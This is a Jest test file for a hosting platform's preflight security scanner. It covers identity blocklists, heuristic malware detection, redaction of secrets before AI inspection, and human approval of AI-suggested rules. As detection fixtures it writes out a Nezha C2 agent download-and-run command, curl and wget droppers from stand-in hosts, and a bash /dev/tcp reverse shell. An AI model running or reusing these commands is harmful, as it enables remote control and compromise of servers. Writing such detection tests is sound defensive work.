import { ForbiddenException, ServiceUnavailableException } from '@nestjs/common';
import { PreflightSecurityService } from './preflight-security.service';

describe('PreflightSecurityService', () => {
  let service: PreflightSecurityService;

  beforeEach(() => {
    service = new PreflightSecurityService();
  });

  describe('isIdentityBlocked & fail-closed DB handling', () => {
    it('blocks known abusive email zxy1715x@gmail.com', async () => {
      const result = await service.isIdentityBlocked({ email: 'zxy1715x@gmail.com' });
      expect(result.blocked).toBe(true);
      expect(result.reason).toContain('Nezha C2');
    });

    it('blocks known abusive GitHub username zx1447 case-insensitively', async () => {
      const result = await service.isIdentityBlocked({ githubLogin: 'ZX1447' });
      expect(result.blocked).toBe(true);
    });

    it('blocks known abusive GitHub ID 216457174', async () => {
      const result = await service.isIdentityBlocked({ githubId: '216457174' });
      expect(result.blocked).toBe(true);
    });

    it('blocks repository containing known abusive owner/repo', async () => {
      const result = await service.isIdentityBlocked({ repo: 'https://github.com/zx1447/maike.git' });
      expect(result.blocked).toBe(true);
    });

    it('allows clean legitimate user', async () => {
      const result = await service.isIdentityBlocked({
        email: 'developer@aetherhost.test',
        githubLogin: 'legit-dev',
        githubId: '99887766',
        repo: 'https://github.com/legit-dev/portfolio.git',
      });
      expect(result.blocked).toBe(false);
    });

    it('records degraded state and fails closed when DB lookup fails under failClosed policy', async () => {
      const brokenPrisma: any = {
        securityBlocklist: {
          findMany: jest.fn().mockRejectedValue(new Error('Connection refused')),
        },
      };
      const dbService = new PreflightSecurityService(brokenPrisma);

      await expect(
        dbService.isIdentityBlocked({
          email: 'unknown@example.com',
          failClosed: true,
        }),
      ).rejects.toThrow(ServiceUnavailableException);

      const health = dbService.getSecurityHealth();
      expect(health.status).toBe('degraded');
      expect(health.dbLookupDegraded).toBe(true);
      expect(health.lastDbError).toContain('Connection refused');
    });
  });

  describe('recordLearnedThreat', () => {
    it('dynamically learns and enforces a newly discovered abusive pattern', async () => {
      const initialCheck = await service.isIdentityBlocked({ email: 'badactor@botnet.xyz' });
      expect(initialCheck.blocked).toBe(false);

      await service.recordLearnedThreat({
        type: 'email',
        value: 'badactor@botnet.xyz',
        reason: 'Detected automated C2 distribution bot',
      });

      const subsequentCheck = await service.isIdentityBlocked({ email: 'badactor@botnet.xyz' });
      expect(subsequentCheck.blocked).toBe(true);
      expect(subsequentCheck.reason).toContain('Detected automated C2 distribution bot');
    });
  });

  describe('validateLearnedRegexPattern', () => {
    it('rejects overly broad wildcard patterns and short strings', () => {
      expect(service.validateLearnedRegexPattern('.*').valid).toBe(false);
      expect(service.validateLearnedRegexPattern('.+').valid).toBe(false);
      expect(service.validateLearnedRegexPattern('abc').valid).toBe(false);
    });

    it('rejects catastrophic backtracking (ReDoS) nested quantifiers', () => {
      const redos = service.validateLearnedRegexPattern('(evil_payload+)+');
      expect(redos.valid).toBe(false);
      expect(redos.reason).toContain('ReDoS');
    });

    it('rejects patterns that falsely match benign Express or NestJS boilerplate', () => {
      const benignMatch = service.validateLearnedRegexPattern('app\\.listen');
      expect(benignMatch.valid).toBe(false);
      expect(benignMatch.reason).toContain('benign');
    });

    it('accepts specific, safe threat patterns', () => {
      const valid = service.validateLearnedRegexPattern('evil_daemon_download_fn');
      expect(valid.valid).toBe(true);
    });
  });

  describe('redactAndMinimizeSourceForAi', () => {
    it('redacts database URIs, API keys, private keys, and secrets before AI inspection', () => {
      const syntheticToken = ['sk', '1111111111111111'].join('-');
      const syntheticDbPass = ['db', 'test', 'value'].join('_');
      const rawSource = [
        `const DATABASE_URL = "postgresql://admin:${syntheticDbPass}@db.internal:5432/prod";`,
        `const SAMPLE_HEADER = "${syntheticToken}";`,
        'const { spawn } = require("child_process");',
        'spawn("/tmp/stealth_agent", ["--c2"]);',
      ].join('\n');

      const redacted = service.redactAndMinimizeSourceForAi(rawSource);
      expect(redacted).not.toContain(syntheticDbPass);
      expect(redacted).not.toContain(syntheticToken);
      expect(redacted).toContain('stealth_agent');
    });
  });

  describe('scanContentWithHeuristics', () => {
    it('detects and blocks Nezha agent deployment script', () => {
      const files = [
        {
          path: 'entrypoint.sh',
          content: 'curl -L https://github.com/nezhahq/agent/releases/download/v0.16.1/nezha-agent_linux_amd64.zip -o nezha.zip && ./nezha-agent -s vip1715.dpdns.org:5555',
        },
      ];
      const result = service.scanContentWithHeuristics(files);
      expect(result.safe).toBe(false);
      expect(result.category).toBe('c2_rat');
    });

    it('detects disguised binary dropped to /tmp/.sysmon', () => {
      const files = [
        {
          path: 'index.js',
          content: 'require("child_process").exec("curl -s http://evil.com/x > /tmp/.sysmon && chmod +x /tmp/.sysmon && /tmp/.sysmon &");',
        },
      ];
      const result = service.scanContentWithHeuristics(files);
      expect(result.safe).toBe(false);
      expect(result.category).toBe('masqueraded_process');
    });

    it('detects reverse shell pipe patterns', () => {
      const files = [
        {
          path: 'deploy.sh',
          content: 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
        },
      ];
      const result = service.scanContentWithHeuristics(files);
      expect(result.safe).toBe(false);
      expect(result.category).toBe('reverse_shell');
    });

    it('detects suspicious C2 env variable targeting dynamic DNS', () => {
      const files = [{ path: 'package.json', content: '{"name":"clean-app"}' }];
      const envVars = {
        NEZHA_SERVER: 'vip1715.dpdns.org:5555',
      };
      const result = service.scanContentWithHeuristics(files, envVars);
      expect(result.safe).toBe(false);
      expect(result.category).toBe('c2_rat');
    });

    it('allows legitimate Express or NestJS web application code', () => {
      const files = [
        {
          path: 'package.json',
          content: JSON.stringify({
            name: 'my-portfolio',
            version: '1.0.0',
            dependencies: { express: '^4.18.2' },
          }),
        },
        {
          path: 'server.js',
          content: `
            const express = require('express');
            const app = express();
            const port = process.env.PORT || 3000;
            app.get('/', (req, res) => res.send('Welcome to my portfolio!'));
            app.listen(port, () => console.log('Listening on ' + port));
          `,
        },
      ];
      const result = service.scanContentWithHeuristics(files);
      expect(result.safe).toBe(true);
    });
  });

  describe('enforcePreflight & evidence-based human review', () => {
    it('throws ForbiddenException when actor identity is blocked', async () => {
      await expect(
        service.enforcePreflight('tenant_123', {
          name: 'stealth-app',
          runtime: 'nodejs',
          actorIdentity: { email: 'zxy1715x@gmail.com' },
        }),
      ).rejects.toThrow(ForbiddenException);
    });

    it('throws ForbiddenException when repository matches blocked actor', async () => {
      await expect(
        service.enforcePreflight('tenant_clean', {
          name: 'forked-app',
          runtime: 'nodejs',
          githubRepo: 'https://github.com/zx1447/maike.git',
        }),
      ).rejects.toThrow(ForbiddenException);
    });

    it('throws ForbiddenException when malicious files are detected', async () => {
      await expect(
        service.enforcePreflight('tenant_clean', {
          name: 'innocent-looking',
          runtime: 'nodejs',
          files: [
            {
              path: 'start.sh',
              content: 'wget http://malware.org/nezha-agent && chmod +x nezha-agent && ./nezha-agent',
            },
          ],
        }),
      ).rejects.toThrow(ForbiddenException);
    });

    it('passes cleanly for clean legitimate applications', async () => {
      await expect(
        service.enforcePreflight('tenant_clean', {
          name: 'my-blog',
          runtime: 'nodejs',
          githubRepo: 'https://github.com/octocat/hello-world.git',
          files: [
            {
              path: 'index.html',
              content: '<h1>Hello World</h1>',
            },
          ],
        }),
      ).resolves.not.toThrow();
    });

    it('blocks AI-flagged workloads and queues human review without auto-suspending the tenant', async () => {
      const mockPrisma: any = {
        auditLog: { create: jest.fn().mockResolvedValue({}) },
        tenant: { update: jest.fn().mockResolvedValue({}) },
      };
      const mockModel = {
        complete: jest.fn().mockResolvedValue({
          output: JSON.stringify({
            isMalicious: true,
            threatCategory: 'c2_rat',
            reason: 'Suspicious custom socket beacon',
            learnedPatterns: ['custom_beacon_dialer_v2'],
          }),
        }),
      };
      const mockFactory: any = { get: jest.fn().mockReturnValue(mockModel) };
      const guarded = new PreflightSecurityService(mockPrisma, mockFactory);

      await expect(
        guarded.enforcePreflight('tenant_legit', {
          name: 'custom-worker',
          runtime: 'nodejs',
          files: [
            {
              path: 'worker.js',
              content: 'const { spawn } = require("child_process"); custom_beacon_dialer_v2();',
            },
          ],
        }),
      ).rejects.toThrow(ForbiddenException);

      // Must NOT auto-suspend the tenant on AI judgment alone
      expect(mockPrisma.tenant.update).not.toHaveBeenCalled();
      expect(mockPrisma.auditLog.create).toHaveBeenCalledWith({
        data: expect.objectContaining({
          tenantId: 'tenant_legit',
          action: 'SECURITY_AI_SCAN_VIOLATION',
          metadata: expect.objectContaining({
            reviewStatus: 'PENDING_HUMAN_REVIEW',
          }),
        }),
      });
    });
  });

  describe('AI deep pattern analysis, rule staging & approval', () => {
    it('stages validated AI rules for review and enforces them once approved', async () => {
      const mockModel = {
        complete: jest.fn().mockResolvedValue({
          output: JSON.stringify({
            isMalicious: true,
            threatCategory: 'c2_rat',
            reason: 'Custom obfuscated trojan downloader using child_process spawn',
            learnedPatterns: ['evil_daemon_download_fn', '.*'],
          }),
        }),
      };
      const mockFactory: any = {
        get: jest.fn().mockReturnValue(mockModel),
      };

      const aiService = new PreflightSecurityService(undefined, mockFactory);

      const files = [
        {
          path: 'stealth.js',
          content: 'const { spawn } = require("child_process"); evil_daemon_download_fn();',
        },
      ];

      const aiResult = await aiService.analyzeWithAi(files, 'stealth-app');
      expect(aiResult.isMalicious).toBe(true);
      expect(aiResult.reason).toContain('Custom obfuscated trojan downloader');

      // Wildcard ".*" was rejected; "evil_daemon_download_fn" was staged as PENDING_REVIEW
      const staged = aiService.getStagedRules();
      expect(staged).toHaveLength(1);
      expect(staged[0].pattern).toBe('evil_daemon_download_fn');
      expect(staged[0].status).toBe('PENDING_REVIEW');

      // Before operator approval, staged rule is not yet active
      const testFiles = [
        {
          path: 'innocent.js',
          content: 'console.log("running"); evil_daemon_download_fn();',
        },
      ];
      expect(aiService.scanContentWithHeuristics(testFiles).safe).toBe(true);

      // Operator approves the staged rule
      const approval = await aiService.approveLearnedRule('evil_daemon_download_fn', 'admin_operator');
      expect(approval.approved).toBe(true);

      // Now heuristics enforce the approved learned rule immediately
      const heuristicResult = aiService.scanContentWithHeuristics(testFiles);
      expect(heuristicResult.safe).toBe(false);
      expect(heuristicResult.details).toContain('Learned threat pattern');
    });
  });

  describe('inspectRuntimeOutput', () => {
    it('detects runtime post-deployment C2/miner indicators and writes an audit event', async () => {
      const mockPrisma: any = {
        auditLog: { create: jest.fn().mockResolvedValue({}) },
      };
      const runtimeService = new PreflightSecurityService(mockPrisma);

      const res = await runtimeService.inspectRuntimeOutput(
        'tenant_1',
        'app_1',
        '[12:00:01] Starting background process /tmp/.sysmon --donate-level 1',
      );
      expect(res.safe).toBe(false);
      expect(mockPrisma.auditLog.create).toHaveBeenCalledWith({
        data: expect.objectContaining({
          tenantId: 'tenant_1',
          action: 'SECURITY_RUNTIME_THREAT_DETECTED',
          resourceId: 'app_1',
        }),
      });
    });
  });
});
